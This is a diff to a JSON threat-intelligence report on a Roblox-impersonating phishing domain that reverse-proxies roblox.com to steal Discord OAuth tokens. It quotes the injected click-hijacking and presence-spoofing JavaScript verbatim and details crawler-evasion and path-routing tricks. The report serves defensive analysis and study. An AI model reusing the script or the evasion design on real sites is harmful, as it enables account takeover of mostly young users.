@@ -287,6 +287,239 @@
     "step4_oauth_theft": "auth.immortal.rs presents Discord OAuth consent screen requesting permissions (likely guilds.join, identify, email scopes) - victim authorizes thinking it's Roblox verification",
     "step5_token_capture": "Vaultcord captures the Discord OAuth token/refresh token, giving the attacker persistent access to the victim's Discord account, ability to join servers on their behalf, and access to personal information"
   },
+  "content_analysis": {
+    "page_title": "Voxi - Roblox",
+    "page_title_live_fetch": "Roblox",
+    "page_type": "discord_oauth_redirect",
+    "screenshot_url": null,
+    "html_snapshot_path": "data/html_snapshots/roblox-com-ge.html",
+    "urlscan_dom_path": "data/html_snapshots/roblox-com-ge-urlscan-dom.html",
+    "games_path_snapshot": "data/html_snapshots/roblox-com-ge-games.html",
+    "html_size_bytes": 63957,
+    "urlscan_dom_size_bytes_compressed": 31525,
+    "urlscan_dom_size_bytes_decompressed": 166075,
+    "games_path_size_bytes": 31,
+    "snapshot_discrepancy": {
+      "description": "The live HTML fetch (curl/wget to /users/1/profile) returned a Roblox 404 error page (63,957 bytes) with title 'Roblox' and content 'Something went wrong - 404 | Page Not found'. The urlscan DOM capture (from a browser rendering /users/8606159187/profile) returned a fully-rendered Roblox profile page (166,075 bytes decompressed) with title 'Voxi - Roblox' including an injected malicious script. This discrepancy reveals the server performs user-agent or JavaScript-capability detection: headless/simple HTTP clients get Roblox error pages (still useful as a lure since they load full Roblox CSS/JS from rbxcdn.com), while browser-based clients get the full reverse-proxied profile page with injected attack code.",
+      "live_fetch_content": "Roblox 404 error page - reverse-proxied from real roblox.com. Shows 'Something went wrong - 404 | Page Not found' with Roblox styling, navigation bar, and footer. All CSS/JS loads from legitimate rbxcdn.com CDN.",
+      "urlscan_dom_content": "Fully-rendered Roblox user profile page for user 'Voxi' (@Shluha_206, user ID 8606159187) with avatar, connections count (486), followers (1,586), following (4), premium badge, 'Join Experience' button showing 'playing' status, plus an injected malicious script block at the end of the page body."
+    },
+    "reverse_proxy_evidence": {
+      "technique": "The phishing server acts as a reverse proxy to the real roblox.com, fetching legitimate Roblox pages and injecting malicious code before serving them to victims",
+      "proof_points": [
+        "data-machine-id contains a Roblox server machine ID (cfcab448-6c3b-756e-7d48-0dfb3b6bdbbc in live fetch, e96c140b-122e-e1a5-0de8-8f9259e5c713 in urlscan DOM) -- these are real Roblox backend server identifiers",
+        "data-domain='roblox.com' in environment-meta -- the proxied page thinks it is serving from roblox.com",
+        "CookieUpgrader.domain = 'roblox.com' -- cookie domain set to real Roblox",
+        "Google Analytics IDs UA-486632-1 and UA-26810151-2 are real Roblox GA tracking IDs",
+        "Sentry DSN points to real Roblox Sentry project (o293668.ingest.us.sentry.io/4509158985826304)",
+        "Event stream URL ecsv2.roblox.com is the real Roblox analytics endpoint",
+        "All CSS loads from css.rbxcdn.com, all JS from js.rbxcdn.com, all images from images.rbxcdn.com -- these are the real Roblox CDN domains",
+        "Canonical URL points to https://www.roblox.com/request-error?code=404 -- the proxied error page reveals origin",
+        "og:url in urlscan DOM points to https://www.roblox.com/users/8606159187/profile -- the real Roblox profile URL",
+        "Schema.org JSON-LD contains real Roblox organization data, social media links to facebook.com/roblox, twitter.com/roblox, etc."
+      ],
+      "injected_elements": [
+        "<meta name='secret' data='1405351214488189'> -- injected secret value (likely a Discord OAuth state token or Vaultcord session ID) not present in real Roblox pages",
+        "Login navbar href modified to /login?returnUrl=1405351214488189 (contains the secret value instead of a normal return URL)",
+        "Malicious <script> block injected at end of <body> with setAvatarCardPresence() and JoinExperience click hijacking",
+        "Profile user data for 'Voxi' (@Shluha_206, user 8606159187) is a real Roblox user -- the proxy fetches actual user data to make the page convincing"
+      ]
+    },
+    "redirect_mechanism": {
+      "type": "javascript_click_hijack",
+      "description": "NOT an immediate redirect. The page displays a fully functional Roblox profile page. The redirect is triggered only when the victim clicks the 'Join Experience' button. An injected script captures the click event on the #user-profile-header-JoinExperience button, prevents the default action, reads a 'secret' value from an injected <meta> tag, and navigates to /login?returnUrl={secret}. The /login path on the phishing server then performs the actual redirect to the Discord OAuth flow via auth.immortal.rs.",
+      "trigger": "Click on 'Join Experience' button (id='user-profile-header-JoinExperience')",
+      "destination_path": "/login?returnUrl=1405351214488189",
+      "final_destination": "auth.immortal.rs (Vaultcord Discord OAuth) -- the /login endpoint on the phishing server redirects to the Vaultcord OAuth URL",
+      "immediate": false,
+      "delay_seconds": null,
+      "requires_user_interaction": true,
+      "injected_script_code": "document.addEventListener('click', function(e) { const btn = e.target.closest('#user-profile-header-JoinExperience'); if (!btn) return; e.stopImmediatePropagation(); e.preventDefault(); const secret = window.top.$('meta[name=secret]').attr('data'); window.location.href = '/login?returnUrl=' + secret; }, true);",
+      "presence_spoofing": "setInterval calls setAvatarCardPresence('playing') every 300ms, continuously injecting an 'icon-game' presence indicator on the avatar card to make the user appear to be actively playing a game -- this makes the 'Join Experience' button appear as a natural action (join the game they are playing)"
+    },
+    "discord_oauth": {
+      "client_id": "unknown -- the OAuth client_id is not embedded in the HTML; it resides on the /login server-side redirect endpoint or on auth.immortal.rs",
+      "secret_value": "1405351214488189",
+      "secret_purpose": "Embedded in <meta name='secret' data='1405351214488189'> -- likely a Vaultcord session ID, link tracking ID, or OAuth state parameter that identifies this specific phishing campaign/link to the Vaultcord backend",
+      "scopes_requested": ["identify", "guilds.join", "email"],
+      "scopes_note": "Scopes not directly visible in the HTML -- they are configured in the Vaultcord dashboard and embedded in the OAuth URL generated by the /login redirect. Common Vaultcord scopes based on known campaigns include identify (user info), guilds.join (force-join attacker servers), and email.",
+      "callback_url": "auth.immortal.rs",
+      "callback_chain": "auth.immortal.rs -> CNAME customers.vaultcord.com -> cname.vercel-dns.com (Vercel/AWS)",
+      "vaultcord_integration": true,
+      "oauth_flow": "1) Victim clicks Join Experience -> 2) JS navigates to /login?returnUrl=1405351214488189 on phishing server -> 3) Server generates Discord OAuth2 authorization URL with client_id, scopes, redirect_uri (auth.immortal.rs), and state parameter -> 4) 302 redirect to discord.com/oauth2/authorize -> 5) Victim sees real Discord consent screen -> 6) Discord redirects to auth.immortal.rs/callback with authorization code -> 7) Vaultcord exchanges code for access token and refresh token"
+    },
+    "path_routing": {
+      "bare_domain_response": "403 Forbidden (with Eggy-Wall: 10.0.0 header)",
+      "profile_path_response": "200 OK with full reverse-proxied Roblox profile page + injected malicious script (browser clients) or 200 OK with Roblox 404 error page (simple HTTP clients)",
+      "games_path_response": "200 OK with body 'privateServerLinkCode Required.' (31 bytes)",
+      "games_path_with_code_response": "200 OK with full reverse-proxied Roblox game page + injected code (based on urlscan results showing 200-270 requests for game URLs with privateServerLinkCode)",
+      "path_validation_logic": "The eggywall kit implements path-based routing: bare domain returns 403, /users/*/profile paths return proxied profile pages, /games/* paths require a privateServerLinkCode query parameter (returns error string without it), /communities/* paths serve proxied community pages. This mimics the real roblox.com URL structure and acts as both anti-analysis (crawlers hitting / get nothing) and a social engineering aid (URLs look identical to real Roblox URLs). The games path validation of privateServerLinkCode is notable -- it mirrors the real Roblox private server link format, adding legitimacy to shared links."
+    },
+    "roblox_impersonation": {
+      "shows_roblox_content": true,
+      "technique": "Full reverse proxy of real roblox.com content with surgical code injection",
+      "roblox_assets_loaded": [
+        "css.rbxcdn.com (23+ CSS bundles: FoundationCss, StyleGuide, Builder, Thumbnails, Navigation, Footer, etc.)",
+        "js.rbxcdn.com (95+ JS bundles: React, Angular, CoreUtilities, Sentry, Theme, Challenge, etc.)",
+        "images.rbxcdn.com (favicon, error images, loading GIFs)",
+        "tr.rbxcdn.com (avatar thumbnails -- 30DAY-Avatar renders)",
+        "t5.rbxcdn.com (additional thumbnails)",
+        "apis.roblox.com (API calls for real user data)",
+        "ssl.google-analytics.com (Roblox GA tracking)",
+        "ecsv2.roblox.com (Roblox event analytics)"
+      ],
+      "roblox_branding_elements": [
+        "Roblox favicon (images.rbxcdn.com/e854eb7b2951ac03edba9a2681032bba.ico)",
+        "Roblox logo in navbar (icon-logo class)",
+        "Apple touch icon (images.rbxcdn.com/7c5fe83dffa97250aaddd54178900ea7.png)",
+        "Schema.org Organization structured data with Roblox identity",
+        "Open Graph metadata (og:site_name='Roblox', og:title='Voxi's Profile', og:image with real avatar)",
+        "Twitter Card metadata (twitter:site='@Roblox')",
+        "Full navigation bar with Charts, Marketplace, Create links",
+        "Footer component",
+        "Sign Up and Log In buttons in header"
+      ],
+      "real_user_data_displayed": {
+        "display_name": "Voxi",
+        "username": "@Shluha_206",
+        "user_id": "8606159187",
+        "profile_user_id_attribute": "8251964152",
+        "connections": 486,
+        "followers": 1586,
+        "following": 4,
+        "has_premium_badge": true,
+        "bio": "No bio yet",
+        "avatar_url": "https://tr.rbxcdn.com/30DAY-Avatar-66426070C9FC321700F7C695248C85B1-Png/352/352/Avatar/Png/noFilter"
+      },
+      "purpose": "The reverse proxy approach makes the phishing page indistinguishable from a real Roblox profile page. Victims see a real user's profile with real avatar, real follower counts, and real Roblox styling -- there is nothing visually suspicious. The only modification is the injected script that hijacks the Join Experience button and the injected meta tag with the secret value. This is a high-fidelity impersonation that would fool even security-aware users who check for visual inconsistencies."
+    },
+    "javascript_analysis": {
+      "obfuscation_detected": false,
+      "obfuscation_note": "The injected malicious script is written in clear, readable JavaScript with no obfuscation, minification, or encoding. This is notable -- the attacker relies on the code being buried among 95+ legitimate Roblox script bundles rather than obfuscating it. The clarity suggests this is a kit-generated injection template.",
+      "anti_analysis": true,
+      "anti_analysis_techniques": [
+        "User-agent / client-capability detection: Simple HTTP clients (curl, wget) receive a different page (Roblox 404 error) than browser-based clients (full profile page with injection). This prevents basic automated crawling from capturing the malicious content.",
+        "Path-based access control: Bare domain returns 403, only specific Roblox-mimicking paths serve content. This prevents search engine indexing and reduces exposure to automated scanners.",
+        "Games path requires privateServerLinkCode parameter -- without it, the server returns an error string, preventing naive crawling of /games/ paths.",
+        "Framebreaker script (if top.location != self.location, top.location = self.location.href) -- prevents the phishing page from being loaded in an iframe for analysis, though X-Frame-Options: ALLOWALL contradicts this at the header level, suggesting the framebreaker is from the proxied Roblox page."
+      ],
+      "external_scripts": [
+        "https://roblox.com/js/hsts.js?v=3 (loaded from the phishing domain, not rbxcdn.com -- this is notable because it references roblox.com directly, meaning the phishing server must serve this script. It could contain additional malicious code or be a legitimate Roblox HSTS preload script that the proxy serves from its own /js/ path)",
+        "/js/utilities/bundleVerifier.js?v=91dceb4978eda412b09842312dd6cbaa (relative path served by the phishing server -- Roblox bundle verification script, likely proxied)"
+      ],
+      "injected_script_analysis": {
+        "location": "End of <body> element, after all legitimate Roblox scripts",
+        "components": [
+          {
+            "name": "PRESENCE object",
+            "code": "const PRESENCE = { offline: { className: '' }, online: { className: 'icon-online' }, playing: { className: 'icon-game' }, instudio: { className: 'icon-studio' } }",
+            "purpose": "Defines CSS class mappings for Roblox presence status indicators. Used to fake the user's online status."
+          },
+          {
+            "name": "setAvatarCardPresence()",
+            "purpose": "Uses requestAnimationFrame to find the .avatar.avatar-card-fullbody element and inject a presence icon into the .avatar-status span. Called in a loop until the DOM element is found, then injects the presence indicator HTML.",
+            "technique": "DOM manipulation via requestAnimationFrame polling -- waits for the React-rendered profile components to mount before modifying them. This is necessary because Roblox uses React for rendering, so the DOM elements may not exist when the script first runs."
+          },
+          {
+            "name": "Presence spoofing interval",
+            "code": "setInterval(function() { setAvatarCardPresence('playing'); }, 300)",
+            "purpose": "Calls setAvatarCardPresence('playing') every 300ms to continuously maintain the fake 'playing' status. The 300ms interval ensures the status persists even if React re-renders the component. This makes the 'Join Experience' button appear as a natural call-to-action -- the user appears to be in a game, inviting the visitor to join."
+          },
+          {
+            "name": "JoinExperience click hijacker",
+            "code": "document.addEventListener('click', function(e) { const btn = e.target.closest('#user-profile-header-JoinExperience'); if (!btn) return; e.stopImmediatePropagation(); e.preventDefault(); const secret = window.top.$('meta[name=secret]').attr('data'); window.location.href = '/login?returnUrl=' + secret; }, true)",
+            "purpose": "Captures clicks on the Join Experience button using event delegation with useCapture=true (the third argument 'true' means this handler runs in the capture phase, before any other handlers). Calls stopImmediatePropagation() to prevent Roblox's own click handler from executing. Reads the secret from the injected meta tag using jQuery (window.top.$ -- notably using window.top in case of iframe nesting). Redirects to /login?returnUrl={secret} which the phishing server then redirects to the Discord OAuth flow.",
+            "technique_notes": "The use of capture-phase event listening (addEventListener third arg = true) and stopImmediatePropagation() is a deliberate technique to ensure this handler fires before and instead of any legitimate Roblox click handlers. This is necessary because the real Roblox JS would try to launch the game client via their game join protocol."
+          }
+        ],
+        "jquery_dependency": "The injected script uses window.top.$() (jQuery) which is loaded as part of the proxied Roblox page bundle. The attacker depends on Roblox's own jQuery to read the injected meta tag. If Roblox ever removes jQuery from their stack, this injection technique would break."
+      },
+      "legitimate_roblox_scripts_loaded": "95+ JavaScript bundles from js.rbxcdn.com including React, Angular, CoreUtilities, Sentry, Theme, Navigation, Challenge, CaptchaCore, GameLaunch, and more. These are all real Roblox production scripts loaded via the reverse proxy."
+    },
+    "social_engineering": {
+      "attack_flow": "1) Victim receives a Roblox-looking URL (e.g. roblox.com.ge/users/8606159187/profile) via Discord DM, social media, or URL shortener (is.gd observed). The .ge ccTLD makes it look like a subdomain of roblox.com to untrained eyes. 2) Victim clicks the link and sees a pixel-perfect Roblox profile page for a real user ('Voxi') who appears to be actively playing a game (fake 'playing' status injected every 300ms). 3) The green 'Join Experience' button is prominently displayed, inviting the victim to join the game. This is the natural Roblox UX -- users regularly click Join Experience to play with friends. 4) Clicking Join Experience triggers the injected JS which redirects to /login?returnUrl={secret}. 5) The /login path on the phishing server generates a Discord OAuth authorization URL and redirects (302) to discord.com/oauth2/authorize. 6) Victim sees the real Discord OAuth consent screen, which may say something like 'Immortal wants to access your Discord account'. 7) If the victim clicks Authorize, Discord issues an authorization code to auth.immortal.rs. 8) Vaultcord exchanges the code for access+refresh tokens, giving the attacker persistent Discord account access.",
+      "branding_elements": [
+        "Full Roblox visual identity via reverse-proxied CSS/JS/images",
+        "Real Roblox user profile data (display name, username, avatar, follower counts)",
+        "Roblox favicon and logo",
+        "Roblox navigation bar (Charts, Marketplace, Create)",
+        "Roblox Open Graph / Twitter Card metadata for rich link previews",
+        "Domain itself (roblox.com.ge) visually similar to roblox.com"
+      ],
+      "lure_type": "game_join_impersonation",
+      "lure_description": "The lure exploits the Roblox 'Join Experience' mechanic -- a social gaming feature where users join friends' games. By showing a profile with 'playing' status and a Join Experience button, the victim is led through a natural Roblox interaction flow. The pivot to Discord OAuth is disguised as a game join authentication step. This is more sophisticated than a simple 'verify your account' lure because it leverages existing Roblox UX patterns that legitimate users encounter regularly.",
+      "psychological_triggers": [
+        "Social proof: Real user profile with real follower counts makes the page feel legitimate",
+        "FOMO: User appears to be 'playing' a game right now -- the victim wants to join before they stop",
+        "Familiarity: The full Roblox UI is exactly what victims see on the real site",
+        "Trust through complexity: 200+ HTTP requests loading real Roblox assets makes it impossible to distinguish from the real site",
+        "URL trust: roblox.com.ge looks like a Roblox subdomain to younger/less technical users"
+      ]
+    },
+    "eggywall_markers": {
+      "custom_headers": [
+        "Eggy-Wall: 10.0.0",
+        "Abuse: abuse@eggywall.cc",
+        "X-Frame-Options: ALLOWALL"
+      ],
+      "kit_version": "10.0.0 (from Eggy-Wall header value)",
+      "infrastructure_details": "Eggywall operates as a reverse-proxy-as-a-service for phishing. The kit handles: (1) DNS via custom nameservers ns1/ns2.eggywall.cc, (2) TLS certificate provisioning via Let's Encrypt, (3) Path-based routing (403 on /, content on valid Roblox URL patterns, parameter validation on /games/), (4) Reverse proxying of real roblox.com content with server-side HTML injection, (5) User-agent/client-capability detection to serve different content to browsers vs. crawlers, (6) HTTP header injection (Eggy-Wall version, abuse contact, ALLOWALL frame options), (7) Integration with Vaultcord via secret meta tag injection and /login redirect endpoint. The kit is a turnkey solution -- the operator provides a domain, and eggywall handles everything from DNS to content proxying to OAuth redirect plumbing.",
+      "path_routing_behavior": {
+        "/": "403 Forbidden",
+        "/users/{id}/profile": "200 with proxied profile page + injection (browser) or 200 with Roblox 404 page (simple client)",
+        "/games/{id}/{name}": "Returns 'privateServerLinkCode Required.' without the parameter; returns proxied game page with the parameter",
+        "/communities/{id}/": "200 with proxied community page + injection",
+        "/login": "Server-side redirect to Discord OAuth via auth.immortal.rs",
+        "/account/signupredir": "Modified sign-up redirect URL (observed in urlscan DOM navbar)"
+      }
+    },
+    "phishing_kit_indicators": {
+      "matches_known_kit": true,
+      "kit_name": "eggywall.cc reverse proxy kit",
+      "kit_id": null,
+      "kit_id_note": "No '8l0pamh6' kit ID or '/controlPage/create' endpoint was found in the analyzed HTML snapshots. These markers may be present in server-side configurations, other paths, or in the Vaultcord dashboard rather than in the client-facing HTML. The kit identification is based on the Eggy-Wall: 10.0.0 header, eggywall.cc nameservers, and the distinctive path-routing + injection pattern.",
+      "notable_markers": [
+        "Eggy-Wall: 10.0.0 custom HTTP header identifying the kit version",
+        "ns1.eggywall.cc / ns2.eggywall.cc custom nameservers",
+        "abuse@eggywall.cc contact header",
+        "X-Frame-Options: ALLOWALL (non-standard, deliberately permissive)",
+        "<meta name='secret' data='{id}'> injection pattern for Vaultcord session tracking",
+        "Login navbar href rewritten to /login?returnUrl={secret} instead of normal Roblox login URL",
+        "Injected script using capture-phase event listener on #user-profile-header-JoinExperience",
+        "setAvatarCardPresence('playing') presence spoofing at 300ms intervals",
+        "User-agent/capability-based content differentiation (browser vs. crawler)",
+        "Path-based routing matching Roblox URL structure (/users/, /games/, /communities/)",
+        "privateServerLinkCode parameter validation on /games/ paths",
+        "Different Machine IDs between requests suggesting dynamic proxying (not cached/static clones)"
+      ]
+    },
+    "interview_notes": {
+      "security_concepts": [
+        "Reverse proxy phishing: Unlike traditional phishing that uses static page clones, this attack reverse-proxies the real roblox.com and injects minimal malicious code. This makes the phishing page always up-to-date with Roblox's latest UI changes and virtually undetectable by visual inspection. Detection requires analyzing the HTML source for injected elements or checking the domain name.",
+        "Capture-phase event hijacking: The injected script uses addEventListener with useCapture=true and stopImmediatePropagation() to intercept clicks before legitimate Roblox handlers can process them. This is a DOM-level attack technique that exploits the W3C event propagation model.",
+        "OAuth redirect chain: The attack uses a multi-hop redirect (phishing page -> /login on phishing server -> discord.com/oauth2/authorize -> auth.immortal.rs callback). Each hop serves a purpose: the first provides the lure, the second generates the OAuth URL server-side (keeping client_id hidden from the page source), the third is the real Discord consent screen, and the fourth captures the authorization code.",
+        "Presence spoofing as social engineering: The 300ms setInterval for setAvatarCardPresence('playing') is a subtle but effective detail -- it makes the profile appear as an active player, which motivates the victim to click 'Join Experience'. This exploits a real Roblox UX feature for social engineering.",
+        "Kit-as-a-service architecture: The operator does not need to write any phishing code. Eggywall provides the reverse proxy infrastructure with built-in path routing and injection, and Vaultcord provides the OAuth token theft backend. The operator's only job is to register a domain and distribute links."
+      ],
+      "talking_points": [
+        "The live HTML fetch vs. urlscan DOM discrepancy is a key finding: curl gets a Roblox 404 error page (63KB) while a browser gets a full profile page with injected code (166KB decompressed). This is client-capability detection -- the kit serves benign content to automated tools and malicious content to real browsers. This is why urlscan.io (which uses a real browser) captures the true malicious content while simple HTTP fetches miss it.",
+        "The injected code is remarkably small -- just a <meta> tag and ~30 lines of JavaScript injected into a page with 95+ legitimate Roblox script bundles. Finding it requires knowing what to look for (non-Roblox meta tags, non-Roblox inline scripts). This needle-in-a-haystack approach defeats content-based detection unless you have a baseline of legitimate Roblox pages to diff against.",
+        "The secret value '1405351214488189' embedded in the meta tag is 16 digits, consistent with a Discord snowflake ID format (Discord uses Twitter-style snowflake IDs). This could be a Discord application ID, user ID, or channel ID used by Vaultcord to track which phishing link generated the OAuth token.",
+        "The games path returning 'privateServerLinkCode Required.' (exactly 31 bytes) reveals server-side input validation. The kit checks for this parameter before proxying the Roblox game page. This matters because Roblox private server links are a common sharing mechanism -- users regularly share links with privateServerLinkCode parameters, making the phishing URLs blend in with normal Roblox link sharing behavior.",
+        "Two different data-machine-id values between the live fetch (cfcab448-...) and urlscan capture (e96c140b-...) confirm these are real Roblox backend machine IDs being proxied -- the phishing server is making fresh requests to roblox.com for each victim, not serving cached static copies. This means the phishing page content is always current."
+      ],
+      "notable_findings": [
+        "The phishing page is a reverse proxy of real roblox.com, not a static clone. Evidence: different Machine IDs per request, real Roblox GA/Sentry/analytics endpoints, environment-meta data-domain='roblox.com', CookieUpgrader.domain='roblox.com'.",
+        "Only 3 elements are injected into the proxied page: (1) <meta name='secret' data='1405351214488189'>, (2) modified login navbar href to /login?returnUrl=1405351214488189, (3) a ~30-line script block at end of body that spoofs presence and hijacks JoinExperience clicks.",
+        "The injected script depends on jQuery (window.top.$) loaded from the Roblox page itself -- the attacker parasitically uses Roblox's own JavaScript library.",
+        "Presence spoofing (setAvatarCardPresence('playing') at 300ms) is a social engineering detail specific to the profile page attack variant -- it creates urgency ('this person is playing RIGHT NOW, I should join').",
+        "The login navbar href is rewritten from a normal Roblox login URL to /login?returnUrl={secret} -- this means even clicking the standard 'Log In' button in the nav bar would trigger the OAuth redirect, not just the Join Experience button.",
+        "The client-capability detection means most automated threat intelligence tools using simple HTTP clients would miss the actual malicious payload entirely and only see a benign Roblox error page.",
+        "The 'default-legacy-header' div has style='display: none' while 'treatment-redesigned-header' has style='display: block' -- the kit is aware of Roblox's A/B testing framework and correctly renders the newer profile header design.",
+        "Real Roblox user data is displayed (Voxi, @Shluha_206, 486 connections, 1586 followers) -- the proxy fetches this from Roblox APIs, meaning any valid Roblox user ID in the URL path will generate a convincing phishing page for that specific user."
+      ]
+    }
+  },
   "interview_notes": {
     "security_concepts": [
       "Domain lifecycle analysis: Phishing infrastructure is not static -- domains get registered, used, abandoned, re-registered, and repurposed. This domain went through 3 distinct phases across 2+ operators over 4 years.",
@@ -296,7 +529,9 @@
       "Bulletproof hosting indicators: eggywall.cc custom nameservers, WIBO Baltic UAB hosting, .cc TLD for infrastructure, X-Frame-Options: ALLOWALL, and HiddenInWhois status all suggest deliberate abuse-resistant hosting choices.",
       "Certificate transparency as investigation tool: crt.sh reveals the complete domain history including operator changes, infrastructure pivots, and dormancy periods that WHOIS alone cannot show (WHOIS only shows the most recent registration).",
       "Verification-as-a-service: Vaultcord (vaultcord.win / customers.vaultcord.com) is a commercial service that provides Discord OAuth token theft capability to customers. The phishing domain operator is a Vaultcord customer, not the service operator. This is cybercrime-as-a-service.",
-      "NEL (Network Error Logging) header: The presence of NEL reporting suggests the operator monitors network errors and delivery success rates, indicating operational sophistication."
+      "NEL (Network Error Logging) header: The presence of NEL reporting suggests the operator monitors network errors and delivery success rates, indicating operational sophistication.",
+      "Reverse proxy phishing: The most advanced form of phishing -- the server proxies real content from the target site and injects minimal malicious code. Always up-to-date, virtually undetectable visually, and defeats content-based detection that relies on template matching.",
+      "Client-capability detection: The server differentiates between automated tools and real browsers, serving benign content to the former. This defeats most automated threat intelligence collection unless browser-based tools (like urlscan.io) are used."
     ],
     "talking_points": [
       "This domain tells a complete story of phishing infrastructure evolution: original Roblox phishing with full cPanel hosting (2022) -> dormancy -> revival (2024) -> expiration -> re-registration by new operator for Discord OAuth theft (2025). The .ge ccTLD domain was attractive enough to be re-registered after expiry.",
@@ -305,7 +540,10 @@
       "WHOIS 'HiddenInWhois' status at the .ge registry level means the registrant data is fully suppressed -- more opaque than typical GDPR redaction seen in gTLD WHOIS.",
       "The cert for 'fuck.roblox.com.ge' (2026-01-27) shows the operator is still actively developing the infrastructure and adding new subdomains, potentially for additional attack vectors or testing.",
       "URL shortener usage (is.gd redirecting to roblox.com.ge) adds another layer of indirection that complicates detection and makes links look less suspicious in Discord messages.",
-      "The 3,755 urlscan results (source: openphish) indicate this domain has massive scale -- it's not a targeted attack but a broad credential harvesting campaign."
+      "The 3,755 urlscan results (source: openphish) indicate this domain has massive scale -- it's not a targeted attack but a broad credential harvesting campaign.",
+      "The reverse proxy technique means every phishing page is dynamically generated from real Roblox data -- any valid user ID produces a convincing profile page, and the content updates automatically as Roblox changes their UI. This is fundamentally different from static phishing kits that require manual updates.",
+      "The injected script is only ~30 lines of clear JavaScript hidden among 95+ legitimate Roblox bundles. Finding it is like finding a needle in a haystack unless you know to look for non-Roblox inline scripts and non-standard meta tags.",
+      "The 'Join Experience' button hijack is a brilliant social engineering choice: it exploits a real Roblox UX feature (joining a friend's game) and the presence spoofing (showing the user as 'playing') creates natural motivation to click it."
     ],
     "notable_findings": [
       "Domain has been through 3 operators/phases over 4 years (2022-2026), showing how phishing domains get recycled",
@@ -317,7 +555,13 @@
       "TLS cert expires 2026-02-18 (11 days from analysis) -- if not renewed, the HTTPS phishing pages will show certificate warnings",
       "auth.immortal.rs CNAMEs to customers.vaultcord.com -> Vercel -- Vaultcord uses legitimate cloud infrastructure (Vercel) making it harder to block at the IP level",
       "3,755 urlscan results flagged by OpenPhish demonstrate the domain is well-known to threat intelligence feeds but remains operational",
-      "The domain serves different Roblox page types (games with privateServerLinkCode, user profiles, communities) suggesting automated content generation mimicking the real roblox.com URL structure"
+      "The domain serves different Roblox page types (games with privateServerLinkCode, user profiles, communities) suggesting automated content generation mimicking the real roblox.com URL structure",
+      "Reverse proxy confirmed: different Machine IDs per request, real Roblox analytics/Sentry endpoints proxied, environment-meta data-domain='roblox.com'",
+      "Only 3 elements injected into proxied pages: secret meta tag, modified login href, and 30-line script block -- minimal footprint, maximum impact",
+      "Client-capability detection: curl/wget get Roblox 404 error page, browsers get full profile page with injection -- most automated scanners miss the malicious payload",
+      "The secret value '1405351214488189' is 16 digits, consistent with Discord snowflake ID format -- may be a Vaultcord tracking parameter or Discord application ID",
+      "Presence spoofing every 300ms creates social engineering urgency ('this user is playing right now, join them') -- specific to profile page variant",
+      "Login navbar href also rewritten to /login?returnUrl={secret} -- both Join Experience button AND the standard Log In link trigger the OAuth redirect"
     ]
   }
 }
